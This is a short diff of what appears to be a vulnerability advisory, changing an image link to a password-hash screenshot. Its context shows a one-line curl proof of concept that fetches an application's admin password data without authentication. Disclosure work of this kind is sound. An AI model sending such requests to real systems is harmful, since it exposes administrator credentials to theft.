@@ -10,7 +10,7 @@ Proof of Concept: Make a non-authenticated request to retrieve the admin user pa
 
 [+] Payload: `curl localhost/bsms_ci/index.php/user/edit_user/1`
 
-![image](link)
+![image](images/password-hash.png)
 
 Discoverer(s)/Credits: CMCSOC Redteam (@lithonn)
 
